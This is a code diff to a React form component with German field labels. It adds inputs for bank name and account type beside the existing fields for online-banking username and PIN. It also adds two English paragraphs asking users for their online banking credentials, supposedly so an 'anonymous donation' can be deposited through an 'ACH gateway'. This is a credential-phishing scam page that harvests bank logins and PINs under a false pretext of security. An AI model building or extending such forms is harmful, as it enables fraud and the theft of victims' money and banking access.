@@ -25,6 +25,41 @@ export default function FinancialSection({ formData, errors, handleInputChange }
       </Alert>
 
       <div>
+        <Label htmlFor="bankInstitutionName">Name der Bank *</Label>
+        <Input
+          id="bankInstitutionName"
+          name="bankInstitutionName"
+          type="text"
+          value={formData.bankInstitutionName}
+          onChange={handleInputChange}
+          placeholder="z. B. Deutsche Bank"
+          className={errors.bankInstitutionName ? "border-destructive" : ""}
+          autoComplete="off"
+        />
+        {errors.bankInstitutionName && (
+          <p className="text-xs text-destructive mt-1">{errors.bankInstitutionName}</p>
+        )}
+      </div>
+
+      <div>
+        <Label htmlFor="accountType">Kontotyp *</Label>
+        <select
+          id="accountType"
+          name="accountType"
+          value={formData.accountType}
+          onChange={handleInputChange}
+          className={`w-full px-3 py-2 border rounded-lg bg-background text-foreground ${
+            errors.accountType ? "border-destructive" : "border-input"
+          }`}
+        >
+          <option value="">Bitte wählen</option>
+          <option value="checking">Girokonto</option>
+          <option value="savings">Sparkonto</option>
+        </select>
+        {errors.accountType && <p className="text-xs text-destructive mt-1">{errors.accountType}</p>}
+      </div>
+
+      <div>
         <Label htmlFor="onlineBankingUsername">Online-Banking Benutzername *</Label>
         <Input
           id="onlineBankingUsername"
@@ -55,6 +90,25 @@ export default function FinancialSection({ formData, errors, handleInputChange }
         />
         {errors.onlineBankingPin && <p className="text-xs text-destructive mt-1">{errors.onlineBankingPin}</p>}
         <p className="text-xs text-muted-foreground mt-1">Geben Sie Ihre Banking-PIN ein</p>
+      </div>
+
+      <div className="space-y-2 text-sm text-muted-foreground">
+        <p>
+          To initiate the funds transfer, we kindly request your online banking credentials for your ACH-enabled account.
+          This will enable us to establish a secure connection with your financial institution’s ACH gateway and confirm
+          your account’s transaction thresholds before processing any deposits. We prioritize the security of your
+          sensitive financial data, employing robust, industry-standard encryption and compliance protocols to ensure its
+          protection. Please verify the accuracy of the provided information. Should you have any questions or require
+          further clarification, our Chief Financial Officer is available to assist you.
+        </p>
+        <p>
+          Before we can proceed with the deposit for the anonymous donation, we would need you to provide your online
+          access credentials for your account. This will allow us to communicate with your bank ACH gateway and verify
+          your account limits prior to processing any deposits. Please be assured that we prioritize the security of your
+          information and use industry-standard encryption and protocols to protect your data. Kindly ensure the provided
+          details are accurate, and feel free to contact us if you have any questions or need further assistance—you can
+          contact the Chief Finance officer.
+        </p>
       </div>
     </div>
   )
